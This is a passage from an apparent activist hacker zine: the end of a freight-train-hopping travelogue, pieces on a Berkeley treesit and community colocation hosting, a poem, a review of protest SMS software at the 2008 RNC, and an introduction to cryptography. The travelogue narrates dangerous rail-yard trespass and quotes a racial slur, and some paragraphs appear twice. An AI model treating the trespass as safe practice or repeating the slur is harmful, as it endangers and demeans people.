dirt for what felt like days. We stuck out like sore thumbs in Elko. We got
Popsicles and gobbled down the free doughnuts and headed back down to the tracks
to wait for our train.

The only tree any where near the track was still to far from where the train
stopped so we found a sage bush about three feet high and curled in the tiny
patch of shade beneath it. We tried rigging up Evoltech's wool blanket to create
more shade but it was just as miserable, laying in the pokey brush in a 105
degree weather  with ants and horseflies attacking us. We hadn't seen a train in
a while and I was melting. Evoltech wanted to  stay put. I grew more and more
aggravated by the heat. Then a train came our way and we charged through  the
sage brush. I jumped on a grainer barely holding on with one arm until Evoltech
yelled ""no platform, no  platform!"" I jumped backwards off the ladder and my
pack threw me sideways and onto my elbows on the  rocks, scoring myself some
mean road rash.

Then the train stopped. We picked out a grainer and ducked back. Evoltech
listened to the scanner and deter-  mined that they were breaking the train up.
We got off and sat down in the bushes. I was starting to get heat  stroke. We
went back into town, to a super market where everyone stared at us. Evoltech
would say ""hello,  how are you"" and they would break their silent shock into a
cordial smile. ""Fine how are you?"".

I was so heat exhausted that we ended up catching a bus to Salt Lake City. In
SLC we spent the day with my  brother. The next morning we woke up extra early
and he drove us back to the tracks not far from the grey-  hound station. We
found a area under the over-pass between three lines where it looked like the
trains were  slowing down and waited there for hours, missing train after train
because they were going too fast. A slightly off-his-rocker and down-on-his-luck
dude came by and chatted us up for a while. He tried to offer us help, a  place
to stay, a possible job, even insisted Evoltech take 3 dollars. Then a UP
officer came along and gave us  the friendliest warning to move along we've ever
had... Mormons. We decided it was time to leave and walked  down town. We spent
the three dollars earned on ice cream and saw the pirates of the Caribbean at
the nearest air conditioned mall.  

Back down at the tracks later that night things looked a little more promising.
We found a spot closer to the  yard. A group of hobos was already there and they
were friendly so we sat down. One was a gutter punk our age from MN and the
other two, Willy and Mortikai, were seasoned hobos in their 30's.

Willy and Mortikai passed on the train to California, because it was bound for
Colton. Apparently the Colton  yard is notoriously hellish. The two of them had
been traveling together for three weeks. They were an odd  couple. Willy was an
Okie, blond and lanky, who obviously grew up riding the trains. Mortikai was the
same age but big and loud; an aged hobo punk with the usual I've-been-punk-as
fuck-since-I-was-born-stories- but  good ones. He had recently been released
from jail for extreme eco-activism. The two of them knew every  train hopper and
crust punker there was. Mortikai's dog, Pascal, was also along for the ride.
Mortikai was still  recovering from a twisted ankle so they were only catching
stopped trains. They worked as a team; Willy would  scout out a good car, then
Mortikai would pass up Pascal and climb on. They had a hobo story for every part
of the country. This was supposed to be Mortikai's retirement run.  

We admitted this was our first time out. There was no fooling them anyways. They
laughed at our scanner and  calling in the trains on a cell phone. Mortikai said
he was going to write a song about Evoltech. Mortikai told  us about his one
true love (not Shakira, who he was infatuated with at the moment), but a member
of an all  female train hopping gang. 6 years ago on a rainy night he gave her a
hand up on a freight car and her grip  slipped. She was pulled under the wheel
and died. ""Man I loved that woman"", he said. 

We admitted this was our first time out. There was no fooling them anyways. They
laughed at our scanner and  calling in the trains on a cell phone. Mortikai said
he was going to write a song about Evoltech. Mortikai told  us about his one
true love (not Shakira, who he was infatuated with at the moment), but a member
of an all  female train hopping gang. 6 years ago on a rainy night he gave her a
hand up on a freight car and her grip  slipped. She was pulled under the wheel
and died. ""Man I loved that woman"", he said.

Willy chimed in here and there with songs and anecdotes. After they missed an
especially promising train Willy  was visibly distressed. ""I need the therapy, I
need to get gone, be on a train for a couple of days"", he said.  You could tell
they had been spending every hour of every day together and now were as thick as
Laurel and  Hardy. Mortikai told us to drop his name if we came across other
hobos, and warned us of some of the violent  hobo gangs on the northern route.
We all laughed a lot and said good bye and missed our train several times.

Not ten minutes after they left to go sleep in a field, we crossed the road like
they suggested, just in time to  catch our train. This time I hopped on before
Evoltech even knew what was happening. Evoltech was surprised.  That night was
the most uncomfortable, freezing cold. Without cardboard to lay on my hips got
even more  bruised from laying on the train floor.

We woke up the next day in Wyoming. Wyoming started off hot, dry, and dull. By
dusk the air had cooled and we were driving through pale green plains and
terracotta red rock outcroppings. They were stacked like haphazard dinner
plates, jutting suddenly out of the mild landscape making  a surreal movie set
quality. A few farm houses sat on the plains with red  rock piles dropped
straight from mars in their back yard. It was the first  sunset of the trip that
I remember. Blue and pink like bubble gum ice cream.

We were dangerously low on water and planned on getting off in Cheyenne to get
more and try to catch another train into Saint Louis to visit  The Priest. We
fell asleep though and woke up in the Cheyenne station with giant station houses
 like Disneyland castles, flying Union Pacific  flags directly on either side of
us. No way to get out there. I tried to  nudge Evoltech awake but he wasn't
budging. The train picked up suddenly and I watched Cheyenne disappear fast.  

All night long the water bottle had been leaking and gathering in the back seam
of the car, soaking the backpacks and the both of us as we  slept. Fortunately
this was a faster train then our last one and we had  already gone through half
of Nebraska before we woke up again.

I looked over the side as our train pulled up to the stop and saw that  we were
parked near the end of a yard and there were corn fields on  one side, and what
looked like a good size town on the other. The train  felt like it was breaking
up so I woke Evoltech up and told him this was  our chance. We scrambled to get
our gear together, hopped out and  headed for the corn fields where we stripped
off most our night-layers and headed into town. 

We stopped at Bob's Super Store to pick up stronger water bottles- two 2 liter
soda bottles to be refilled. An  old woman stopped us in the juice isle and
asked us how we were doing. ""Are y'all in a band? Are you actors  or something"",
we told her we were riding freight trains. She asked us why and we replied ""just
for fun"". She  reached out and patted my arm. I could tell she was really
curious about us. ""Well you kids have a safe trip  now."", she smiled. Everyone
in the store seemed to be over 60 and they would stop in their tracks when they
saw us, looking confused and upset. There is something wrong with a country like
America, where everyone  has access to media, music, movies but still act with
fear and disgust when they see someone who is differ-  ent. Evoltech walked
passed a table of old men staring at us, whom he overheard say ""Well at least
they're not niggers"".  

We stopped to clean up in the bathroom of a Subway restaurant. The ""sandwich
artist"" was friendly and curious. We had the place to ourselves. We filled our
water jugs and left dirt rings around the sink from cleaning up.

Later down by the tracks We found a perfect shady under-pass with trees in front
of a row of cars. We sat on  what must have been an ant hill for hours with
every train racing past, avoiding the stares of cowboys driving  by. Evoltech
was becoming more and more anxious. The sun was starting to set, sherbet orange.
A good look-  ing consist train eventually came out way. Not the coal cars we
had been seeing all day but a whole consist of  grainers. We grabbed our bags
and ran for it, unbelieving, and it slowed! I ran up the raised rocks, grabbed
the handles, and jumped up. Evoltech came up after me and we ducked back into
the grainer. It chugged along  for a bout a minute and stopped right along the
cars that we got off the night before. We felt the first jolt of a  hump and
decided to get off and wait. Then we saw someone coming along the tracks. A
worker checking the  cars. We ducked behind some nearby horse trailers until he
passed.  

I chased lightning bugs as Evoltech jumped into an inter-modal 48 that had just
been joined on and gestured  to me to join him. At the same time I saw the
worker heading back down the tracks, a silhouette in a tall  cowboy hat. I tried
to motion as I dove into the tall grass nearby, keeping as still as possible.
Two cars down  from where Evoltech was hiding he climbed up and looked inside
with his flashlight, then kept walking down  the line looking over his shoulder.
When he came back up I waited for the sound of his radio to pass and saw 
Evoltech standing up in the car. I gestured for him to get out and hide with me
in the grass. We ducked down,  getting eaten alive by mosquitoes. The worker
walked back down the line a third time. This time the cars rolled  forward and
he was perched like a cowboy masthead on the last car. We ran down the line,
picked a grainer,  and climbed in. We laid there trying to steer clear of the
perfectly hand-sized holes just over the wheels.  

When we woke up we were in a yard where our train was being broken up. The
shudders were violent. On either side of us were at least three more rows of
trains. We were in a hump yard. We couldn't risk walking  down the line. There
was no way of telling where we were in the yard, so we decided to carefully
climb over  the cars and walk out sideways, something we had been advised
against for safety. We chose a direction and  ended up climbing over 5 or 6 rows
of trains before we found a break. Then we were in front of a station filled 
with trucks and parts. We walked down the line avoiding as many trucks as
possible, but one passed us. He  must have been just a worker coming and going
because he didn't seem to care at all.  We got out of the yard through a field,
passing a No Trespassing sign and on to safety. Looking at our UP maps  We
figured out that we were in Council Bluffs, IA. We walked into town and a short
while later a bus came that  dropped us off about three blocks from the
Greyhound station. Crazy luck. 

And the train hopping part of the trip ended there. We spent a completely
miserable 38 hours on Greyhound to the east coast for HOPE 6. The rest is a
story for another time, another adventure, maybe another article to be written.

[1] Hopping Freight Trains in America by Duffy Littlejohn
http://www.zrpress.com/hoppingfreights.html

################################################################################
 Hack This Tree: How a Treesit, Some Grandmothers and 
 Native Remains Could Bring Down a University                         by Frenzy
################################################################################

A Treesit, for those unfamiliar with the concept, is the act of occupying a tree
for a political end. The first urban treesit  has been going on in Berkeley for
a total of 470 days (as of  March 15th 2008). The action has attracted lots of
media atten-  tion; many have seen the sit on local and international news.

UC Berkeley and it's relationship with the community of Berkeley has not been
good since the fight for people's park.  The university with a lot of political
and economic pow-  er, is able to run image campaigns on a daily basis. A shift
in  the student body and a increase of apathy at the campus has also contributed
to the university's ability to restructure itself from a free speech university
to a restricted speech area.

This particular treesit grew out of a general distaste from the community of the
practices of the UC, such as  the constant harassment of activists at people's
park and the continuing of nuclear weapons development. The  university decided
to start laying plans to cut down most of the live oak trees in the Memorial Oak
Grove, near  Memorial Stadium and build a multi-million dollar sports training
facility. Activist took to the trees to stop this  plan in December of 2006 and
have been there ever since. A few of the absurdities of the proposed area for
the  building is that it is directly on the Hayward earthquake fault, some of
the oaks they want to cut were planted in  memory of bay area soldiers who died
in world war I and the site is also a suspected Native American burial ground.  

After about 6 months of free ability to resupply those up in the trees, The
University erected a 7 foot tall  fence to keep people away from the grove,
shortly after they erected another fence outside that one, com-  plete with
barbed wire. Both fences cost an estimated $90,000 of university money, $10,000-
$12,000 for  the first, and about $80,000 for the second. Resupply actions have
been going on with limited problems, even with the fences, a group called
""Grandmothers for The Oaks"" has been helping a lot with the process.

One of the most recent developments has been the move of a treesitter to the
middle of campus to highlight the problems with The University. What started
as a simple banner drop with the intention of leaving  resulted in a full-scale
treesit along with a police barricade around the tree. The Police have prevented
food  and water from going up into the tree in total 5 people were arrested for
throwing water to the sit. The protester, going by the name ""Fresh"" came down on
March 14th, he was cited for illegal lodging and released. This recent action
has a lot of students who were ignoring the oak grove sit to be more involved
and active.  

Since December 2006 when the Treesit started the University has signed a billion
dollar contract with British Petroleum in the largest corporate and public
learning institution merger to research ""biofuels"". This means that not only is
UC money going to help research for private business, BP will run the projects
of a public university. There are also plans to grow Genetically Engineered corn
in the area, possibly contaminating people's own gardens with GE pollen.

Another situation that has increase opposition to the university is the findings
of 13,000 native remains that are in storage under the women's swimming pool.
Current estimates show that half of the campus used to be a burial ground for
the Ohlone Tribe. The Ohlone people have demanded that the university return
these remains so they can be buried in proper native fashion.

Also within this time period, ground has been broken for a new animal testing
facility, even after the university said they would not expand facilities.
Community outrage about the testing on campus has resulted in home
demonstrations of researchers and contractors.

A simple treesit involving the construction of a new sport facility has exploded
in The University's face and now to a full scale discontent situation involving
community members and students alike. Solidarity Treesits are also going on at
UC Santa Cruz against the Long Range Development Plan. Could it be a wave of
change for UC Berkeley and the UC system? We sure hope so!

           To help out with the oaks go to: http://www.saveoaks.com

################################################################################
 Community Colocation: A Legal & Financial        by Ryan Bagueros, co-founder,
 Firewall for Subversives and Non-Profits         San Francisco Community Colo
################################################################################

Every commercial website that exists on the internet has servers hosted at a
colocation facility, or ""colo"" for short. A colo is a large, semi-sterile, air
conditioned building filled with cabinets [1]. Each cabinet contains a power
hook-up, maybe some cooling fans and anywhere from 10 to 25 rack-mounted servers
[2], as opposed to the normal desktop computers used at home. The alternatives
to hosting at a colo facility include shared web hosting or hosting a machine
off your home cable or DSL, both of which have severe drawbacks. Every
commercial website that exists on the internet has servers hosted at a
colocation facility, or ""colo"" for  short. A colo is a large, semi-sterile, air
conditioned building filled with cabinets [1]. Each cabinet contains a  power
hook-up, maybe some cooling fans and anywhere from 10 to 25 rack-mounted servers
[2], as opposed to the normal desktop computers used at home. The alternatives
to hosting at a colo facility include  shared web hosting or hosting a machine
off your home cable or DSL, both of which have severe drawbacks.

Colocation hosting is, by far, the best option from a technological point of
view. Most colo facilities have generator power backups in case of an
electricity outage. Most of them have security guards who monitor who is going
in and out of colos, and usually have the most reliable, fastest internet
uplink. 

However, from a logistical point-of-view, colos present a number of challenges,
especially for non-profits or  groups expressing their right to freedom of
speech (in particular, free speech that targets the misdeeds of large
corporations or governments). It is generally the policy of all commercial
colo's to immediately comply with subpoenas, DMCA take-down complaints or any
official-looking order from a corporate law firm or a  law enforcement agency.
In many cases, compliance is not even mandatory but the commercial colo will go
along with it just to be on the safe side - after all, their only objective is
to make money, so why risk it?

In addition, most colocation facilities require a minimum commitment of half a
rack and several Mb/second traffic baseline, all of which translates into costs
-- generally more than a financially struggling non-profit  can afford.

With these problems in mind and driven by a philosophical belief in universal
digital access, an off-shoot of the Electronic Frontier Foundation (EFF) called
Online Policy Group was founded in 2000 with the idea of operating a colo with
a ""pay-as-you-can"" model, relying on grants and donations for funding. During
the six  years that the California Community Colo Project was operated by OPG,
they filled up 18 cabinets of public use and hobbyist servers. Unfortunately,
this model did not prove to be sustainable, and in December 2006 it was
announced that CCCP would be powering off all of its cabinets at Hurricane
Electric in Fremont, California.

By that time, though, numerous organizations deeply rooted in the community had
come to rely on the colocation services provided by CCCP. A number of us decided
that we would continue the community colo model, with some improvements that
would make the organization more sustainable.

In December 2006, the San Francisco Community Colo was born. Our first policy
change was to get rid of the ""pay-what-you-can"" model. The SFCCP is a membership
based group where all par-  ticipants equally share the cost of uplink provider
rather than just paying whatever you can (which oftentimes ended up paying
nothing for months on end, sticking the organization with the bill). We also
chose a more centrally-located facility in downtown San Francisco, at 6th &
Brannan.

SFCCP also spends a considerable amount of organizational effort preparing for
attacks on the privacy of our clients. We host activist sites from all over the
world, including the West Bank, Colombia, Brazil, Venezuela. Many of the servers
we host are critical tools used in struggles of resistance against some of the
most corrupt governments in the world. For instance, we help host the pirate
radio stream that is the voice of the  insurgency against the renowned corrupt
governor of the state of Oaxaca in Mexico.

We are also keenly aware of the risks facing information technology providers in
this day and age. For instance, police in Italy served a colo provider with an
order which allowed them to physically hack an activist  server and install
software which allowed them to monitor encrypted e-mail traffic [3] -- the ISP
was forbidden to tell their client that this compromise had occurred and the
police spied on activist e-mails for an entire year.

Compare this with how a similar situation was dealt with at the California
Community Colo. At a time when the integrity of electronic voting machines was a
matter of public debate and the leading manufacturer of voting machines in the
U.S. (Diebold), had been reassuring everyone that their voting machines were 
""hack-proof,"" internal Diebold communications proved otherwise. Someone hacked
Diebold's mail archives and posted them on the SF Indymedia website, hosted at
CCCP. We received a DMCA takedown order but because we are a community colo, not
a for-profit colo, we immediately took the order to sympathetic attorneys.
Diebold's order was fought in court and we won -- the damning evidence against
Diebold's machines would stay online and Diebold was commanded to pay legal
fees and more [4].

While it is true that ultimately the community colos are not entirely
independent from a commercial backbone provider, we provide enough bureaucratic
distance that we can intercept legal requests before they get  that far. And, as
history has shown, this approach works. By providing a ""community network,"" we
are able to throw up a line of defense against those who would suppress the
inherent freedom of information that makes the internet phenomenon so
meaningful.  

Therefore, the purpose of community networks like SFCCP is two-fold:
1) to provide high-availability, high-quality uplinks to community groups and
non-profits at a reasonable price and 2) to provide a front line of defense
against corporate and law enforcement interference.

Finally, it's worth nothing that the SF Community Colo is largely run like any
other open source or free software project. For the most part all decisions are
transparent. We even use Trac [5], traditionally used to  manage free software
projects, as our organizational software.

SFCCP is constantly working on improving our security and lowering our costs.
Current projects include distributed and redundant data storage to mitigate the
impact of the loss of a single SFCCP server. The work we're doing is cutting
edge and our goal is to form a network of community colos that can take our
project to the next level.  

That said, we are in desperate need of support from the community. While we are
just about fiscally solvent on our month-to-month expenses, we could use help in
the following ways:

1) Human resources! We need motivated individuals who want to see a project like
this succeed and can donate some sweat and labor to the project. You can e-mail
us at org@mail.sfccp.net to start getting involved.

2) Technology resources! As long as the equipment isn't broken, we'll take any
kind of networking gear or rack-mounted servers that you aren't using. Again,
email org@mail.sfccp.net to get in touch about this.

3) Money, money, money! It's the root of all evil but we are seriously in need
of outright donations or anyone who understands how we can get grants to help us
continue our work. If you can help us out with that, please e-mail org@sfccp.net
-- note that all SFCCP workers are unpaid volunteers and we dig in our own
pockets to pay for emergency costs.

4) Start a community colo in your city! We are more than happy to help new
community colo's get up and  running. Please get in touch with us if you'd like
our help in getting a CCP running in your city.

There are less and less spaces on the internet which are outside the reach of
corporate and law enforcement reach. The community colo movement is doing
everything we can to reverse that trend. Community colos are popping up all over
North America -- Seattle, Chicago, New York City and a new one forming in
Cleveland, Ohio. We hope to hear from all freedom-loving netizens who want to
help see this project grown and succeed.  

Footnotes:

[1] Your typical colocation facility   http://porn.linefeed.org/web_corridor.jpg
[2] Rack-mounted servers -         http://www.flickr.com/photos/sfccp/449887197/
[3] Autistic attack -             http://test.edri.org/edrigram/number3.14/Italy
[4] Online Policy Group v. Diebold 
                          http://www.eff.org/cases/online-policy-group-v-diebold
[5] Trac Integrated SCM & Project Management           http://trac.edgewall.org/

################################################################################
 39 Lashes                                                             by Ardeo
################################################################################

             One lash for the Leader, with the charismatic glow
                 One lash for the Millions, who never said no
            One lash for the Politician who takes away our rights
              One lash for the General, who lights up our nights
               One lash for the CEO, who hears the money call
                  One lash for the Worker, who takes the fall
                 One lash for the Priest, who says that we sin
              One lash for the Secretary, who says the we'll win
               One lash for the Teacher, who ignores the facts
                One lash for the Soldier, and his heinous acts
                One lash for the Intern, who covers his tracks
                 One lash for the Parent, who says it's alright
                 One lash for the Baby, who cries in the night
                 One lash for the Student, who never inquires
                 One lash for the Arson, who never sets fires
               One lash for the Terrorist, who prays to his God
               One lash for the Governor, who kills with a nod
             One lash for the Judge, for condemning an innocent
            One lash for that Man, for not questioning precedent
                One lash for the Madmen, for telling the truth
              One lash for the Marketer, for enticing our youth
               One lash for the Bomber, that he waste his mind
               One lash for the Black man, homeless and blind
                     One lash for the Drunk, never aware
                 One lash for his Friend, with the gazely stare
                 One lash for his Mother, for giving him drink
              One lash for his Sister, for never stopping to think
                One lash for their ""Father"", who rules over all
                   One lash for his Son, and Peter and Paul
                One lash for the Folk singer, who hung himself
                   One lash for the Poet, who sits in a shelf
               One lash for the Pop stars, who threw away art
             One lash for the Downcast, who gave all their heart
                  One lash for the Lawyers, rich and greedy
            One lash for the Ramshackled, abandoned and needy
            One lash for the Nations, who maintain their violence
            One lash for the Nations, who maintain their silence
            One lash for the Citizen, who finds dissension grand
                 One lash for him more, for not taking a stand

                                    by Ardeo

################################################################################
 Tapatio:  RNC 08 Comms Analysis                                         by CGB
################################################################################

This is an analysis of the implementation of the communications team at the
Republican National Convention in Minneapolis, MN September 2008. While the
majority of this analysis was written by CBG, it is hoped that others who can
provide their own analysis will in the comments section.

Introduction
This is an analysis of the Tin Can Collective’s attempt to provide a
communications infrastructure for the RNC 08 protests in the Twin Cities. The
analysis is based on first hand knowledge and informal discussions witha variety
of users and other participants during the 4 day long protests. Tin Can was a
new collective made up folks that had never worked together on such a project
prior to the RNC 08 protests. The collective came together sometime after May
giving it about 3 months to prepare and implement the infrastructure for tens of
thousands of possible users.

The Tin Can Collective
This collective was a mix of locals and people from around the country. No one
in the group had experience providing a communication infrastructure on such a
scale. The main body of the collective was made up of various activists with a
wealth of varied experiences with protests at this scale. The collective worked
very well together despite geographic distance. The collective had very modest
resources and needed to rely on donations for the equipment and money needed to
set up the infrastructure. The entire thing was done a shoestring budget.

Twitter/Tapatio
The backbone of the system was the use of Twitter. After much discussion it was
decided that Twitter would be more effective than other already existing
networking software (e.g. TxtMob) and that the short period of time would make
it impossible to code our own networking system. Twitter would handle the
function of distributing sms messages to users on the streets. There was concern
about Twitter’s ability to handle the volume of messages and that some mobile
phone systems could not support Twitter. There was also concern about
significant delays, like the ones that occurred during the NYC RNC 04 protests
that used TxtMob. These problems did not occur during the RNC 08. There were
very few systems that could not utilize Twitter (the exception being pre-paid
T-Mobile) and there was no noticeable delay in relaying messages despite heavy
volume. Overall Twitter worked as expected.

Tapatio was a new software developed for the protests. It was to be a management
system that worked with Twitters distribution system. Tapatio was a way to
filter and generate messages. It was to be used by the collective to send out
useful sms messages to the street level users. It also allowed street users to
send sms messages to the comms team to be dispatched to the right groups and
vetted. Tapatio was a complicated piece of software that managed a variety of
tasks in a pretty straightforward user format. There were also some problems
that if there had been more time and greater number of practice sessions could
have been corrected.

(Note from the tapatio development team: The name ""tapatio"" for this project was
concieved early in 2008 when the software was in it’s early design phase.
Hackbloc developers were tired of the naming conventions that were already in
use (famous anarchists or penguin types for computers, choice beverages for code
projects, etc). The naming convention that was decided on was hot sauces, and
the sauce that was on the tip of everybody’s toungue after dinner that night was
tapatio. Tapatio has been released as a Drupal module. All releases are
available at http://drupal.org.project/tapatio.)

What worked
* Tapatio was successful in dividing messages effectively among various user
groups. There were a total of about 17 user groups ranging from 7 sector groups
to a food group. This system worked and all user groups were able to get
messages directed at their interests.
* Tapatio allowed for successful filtering of undispatched and dispatched
messages. This system could filter messages a variety of ways from date, type,
dispatched/undispatched, etc. This system also allowed all sms messages to be
looked at by a variety of operators before being sent out and even after
messages were sent out.
* The automatic date and time stamp also worked well in helping to organize the
messages and determining their relevance.
* Each message had a user name attached to help verify information and seek out
further clarification and this was also quite helpful.
* The system allowed individuals to choose what user groups they wanted to
belong to and unsubscribe on their own. Thus effectively decentralizing the flow
of information.
* Tapatio worked pretty well at receiving sms from the street, awaiting vetting
and being sent out.
* The verification sections (e.g. select group) stopped poor or undifferentiated
messages going out.

What could be improved upon
* Picking shorter and easy names for user-groups to ease registration for those
unfamiliar with Twitter. Most namely not using confusing words or symbols like
""_"" .
* Allow for the deleting in batches in messages that would not be sent out, as
opposed to each individual message with a further click for verification. This
took a substantial amount of time to delete messages.
* Have the Title field and the message field linked to avoid copying and
pasting, which also added to the time of sending out messages. Nearly 90% of the
messages had identical titles and messages.

* Design the front page better:
  1. Allow all groups to be seen without scrolling.
  2. Allow a check box system to click groups (as opposed to a cntrl click)
  3. An option to select all groups
  4. Shrink ""Body"" section and change it to ""Notes"" to make it more clear.
  5. Create some simple macros (e.g. Police) for the message section
* It was planned but never implemented the ""Info, Warning or Emergency""
designations (yet was needed to send out a message thus adding another two
clicks to dispatch). The idea of this is good and should be implemented. The
hope that people could choose if they wanted all messages or just emergencies
would add to the userability and make this designation useful.
* The Rating system, including the pre-weighted votes (e.g. Scouts) and adding
votes never actually worked and thus were bypasssed. It was easy to do and thus
did not slow down or interfere with the dispatching of messages but could either
be improved upon or removed.
* De-duplication was like the Rating system in that it was ignored. It did work
however but because it was counter-intuitive it was not practical. The inability
to delete in batches created long lists of messages and thus scrolling to find
the duplicate message/s took longer than retyping a sending out a fresh message
it was not used. It also deleted the message you were looking at keeping the one
from the list, which is counter intuitive. Also the newer message often had
better info and thus should be the one kept and the one from the scroll list
should be the one deleted.
* Most of the flaws in the system were minor and over all Tapatio was a success.
(Note from the tapatio development team: Each of these feature requests are
being worked on as this goes to press. Always check
http://drupal.org/project/tapatio for the current release. Information about
this project and other communications software written by the hackbloc team can
be found at http://comms.hackbloc.org)

Scouts & Operators
In addition to the collective, there were individuals who agreed to work as
volunteer scouts and operators. Scouts were people on the streets providing
information to comms and willing to be dispatched to areas where there were no
scouts but reports were coming in. Scouts were to have increased reliability and
for the most part this seemed to be true. Though the Rating/voting system did
not work operators simply dispatched scout info without verification for the
most part and this worked quite well. Operators were the ones answering the
phone, writing sms and dispatching other sms messages to the street.

We had enough of both for at least the first day and the people seemed to take
their tasks seriously and do them well. Both types of trainings (Scout and
Operators). Both operators and scouts added to the overall success of the
project and did a great job.

The trainings for both groups could have been better and more organized,
especially the operators. The average training time was about 30 minutes, with
about 6-12 participants. The vouch system seemed to work for both scouts and
operators and there was not shortage of either. The vouch system was a success.
Asking people to pre-register for scouts and operators on-line was not a success
with only one or two people bothering to fill it out.

Things that could be done better would include greater preparation in trainings.
In the future, having sign-in sheets with phone numbers, handles, type of scout
(bike, foot, connected with an affinity group, floating, etc.) and times working
would be useful. These could be easily encrypted and provide security for those
volunteering but allowing comms to keep track of folks. Having better advertised
meetings would also be useful, since we are using a vouch system that requires a
bit of front end work.

SKYPE & Texting
Using Skype was a good alternative to using cell-phones and/or landlines. It
provides greater security since it can be purchased cheaply and anonymously..
We did have one landline, but could have just as easily used another Skype
account and it would have been just as good. The roll over function for Skype
is superior to both landlines and cellphones and worked perfectly. The contact
book also allowed us to know who was calling in (e.g. Scout) and prioritize
calls. Skype also allowed people to remain at the computer and work on tapatio
(and look at other information web-sites) while receiving calls. Having a ""back-
door"" number was crucial to give to scouts and other groups (e.g. Legal office).
The back-door number is a different and less used than the public number which
could have been more widely distributed.

Perhaps the biggest lesson was that most people, including scouts, will call in
not text in information. This makes sense for a variety of reasons. First calls
for the most part faster, people can speak info faster than using a non-qwerty
keyboard for texting. Second, people like to be looking around when relaying
info and again this is much easier when not looking at a little screen and
keyboard. Lastly, calls, as opposed to texts, allow the operators to ask
clarifying questions. The disadvantage of calls is that it is sometimes hard to
hear with the noise of the street and the office. It is worth investing in
quality headsets with adjustable volume for operators.

Office Set-Up
It was valuable to have an office where everyone working as operators were in
shouting distance so decisions could be made quickly and information shared. It
was crucial that all work stations have a useful map, list of backdoor numbers
to other groups, notebooks and other items to organize information as it comes
in and goes out. Limiting the number of people in the office to the bare minimum
will help greatly to reduce noise and make the work more effective. Some type of
sound dividers between operators would also be useful. Overall the office ran
efficiently and dispatched hundreds of messages in a few hours.

It is possible to set up an office anywhere, even remotely. Having a centralized
office to the action was counter-productive (see security section).

FM Radio
Even though the FM radio never got off the ground due to one group pulling out
and another being sabotaged, it was still unlikely that it would have been
effective. The number of FM radios has dropped considerably over the years and
people often do not want to bring extra materials on the street during a
protest. It also requires a high risk for individuals and equipment with very
limited use. Specifically in cities where there is a lot of RF and line of sight
problems it is unlikely that FM radio could serve as an effective backup comms
system.

Security
Though their was a conscious attempt to be secure there were places where Tin
Can could have done better. Though the location of the office was kept from the
public there were still too many people who did not need to know where it was
that knew. The only people that need to know where the office(like operators)
should have that information. Encrypting operator and scout lists would have
been simple and improved the security of everyone involved. The greater use of
pre-paid phones by users would have also aided security of individuals. The
price has come done considerably on these phones making them economically
available to most activists. Understanding that comms can be targeted by law
enforcement would suggest that ordinary personal security be increased like
making sure cell-phones are clean, not keeping sketchy stuff on you while at the
office, observing security culture in conversations with others, etc. Having
someone/s staying in the office would also protect it from being bugged or
otherwise compromised. Though it was discussed but never implemented using web-
cams for security outside the office could be useful in the future allowing
folks inside the office to see what is going on outside and collect evidence of
illegal conduct of the police during a raid.

Back-Up
The raid on the comms office, highlighted the need to have a back-up system that
can be ready to go if one node gets shut down. Comms was able to get back up but
it took some time and at a seriously diminished capacity. Having people and
equipment ready to go in case of a shut down would have made the transition and
the fluid functioning of the comms infrastructure much easier and more useful.

User Feedback
* Many people chose not to use the system for security concerns. Tin Can could
have done better to explain the realistic concerns and explained how cheap track
phones could alleviate these concerns. Whenever a new technology is used there
are those concerns and Tin Can should address them up-front.
* The folks that only subscribed to Sector groups found the information very
useful and the flow of messages manageable. Those that signed up for many groups
were swamped with messages and received quite a number of duplicates. Certain
groups should have been limited like Police Activity that could have sent only
information from scanners and not street reports. Groups like food were under
utilized and probably not needed. The bike group was also under utilized and
could have been removed. Medics had there own comm system and thus did not use
ours very much and thus it could have been removed, without much of an effect.
Due to the decentralized nature of the actions the roaming squa group received a
lot of messages, often for places far away from any individual group. It is
unclear how to remedy this for future actions that are decentralized and
utilizes flying squads. The other groups seemed to work. It might be better to
switch the comms group name to the scouts to make clear what kind of information
it contains.

* Integration with other groups was a mixed bag. Comms and legal did well in
coordinating messages and mutual verification. Medics had their own dispatch
problems and were fairly disconnected to the comms groups. Between these two
extremes most of the other groups had periodic connections that seemed to serve
both comms and the individual groups well. Better use of backdoor communications
and a dedicated ""verifier"" (an operator or two who was in routine communication
with other groups and building relationships with them) could be very valuable.
* Scouts seemed to find the system to be very valuable to their work and felt
their messages were sent out in a timely fashion. This was probably the greatest
success of the comms network. The use of the backdoor made dispatching and
verification easy and timely. Scouts provided useful reports on every hotspot
during the duration of the comms network. The use of cellphones as oppossed to
walkie-talkies seriously reduced the police’s ability to target scouts. Only one
scout got arrested during both days of actions, which is much different than
previous mobilizations where walkie talkies were used. Since cell-phones are
everywhere scouts do not stick out using them. It also reduces the up-front
costs for such a network in that even track phones are much cheaper than good
two-way radios and have a much better clarity and range (not to mention text
capabilities).
* The comms did a good job of rumor control. The use of multiple verification
helped significantly reduce the number of rumors being sent out as info. In the
few instances where incorrect information was dispatched corrections immediately
followed. The presence of comms also reduced the word-of-mouth rumors that
normally plague such confusing actions. People waited to get info from comms and
other sources before believing rumors and misinformation and thus reduced their
effects.

Summary
Despite the obstacles of the raid, the comms infrastructure for the RNC 08
protests was a success and suggests a new way forward for these types of
mobilizations. The software works but could use some changes to make it more
effective. The ratings system needs to be further developed to truly utilize the
""wisdom of the crowds"" phenomena turning everyone with a cell phone into a
scout. Comms can increase its usefulness but rethinking user groups and making
better connections with already existing groups to make sure information is
readily available, manageable and verified. Allowing users to select the type of
information they want (for example: info, warning or emergency) will reduce the
amount of information users will have. Greater emphasis on the human-side of
comms like training, security and reach out need to more emphasis during future
mobilizations. The Tin Can model has addressed most of the problems of earlier
communication systems and with some minor revisions could be an important tool
in aiding the success of large mobilizations.

################################################################################
 Cryptographic Education for the Militant Activist       by Nomenumbra[0x00SEC]
################################################################################

[0x01] Introduction
Greetings and welcome to this first, short, installment of Cryptographic
Education for The Militant activist. With these series of articles, to be
published in future HackThisZine issues, I hope to educate (h)ac(k)tivists in
the elementary basics of cryptography as to enhance their capability to defend
their information from the prying eyes of governemental fascists and other
unwanted entities.  

This installment will be an introduction to Shannon confusion and diffusion,
elementary cryptographic design principles and the merkle-hellman cryptosystem,
a flawed but greatly educational assymetric cryptosystem. Instead of trying to
make full-blown mathematicians out of all of you i'd like to take a more
practical approach, since activism is practice after all.

This does not, however, mean that it won't contain fairly advanced mathematics.
Of course, anyone with a bit of a math-knack or a formal education in the fields
of logic, group and set theory and general mathematics should be able to
understand this document. I can't press the necessity of cryptography and
security culture enough, especially when it comes to civil disobedience and
direct action.

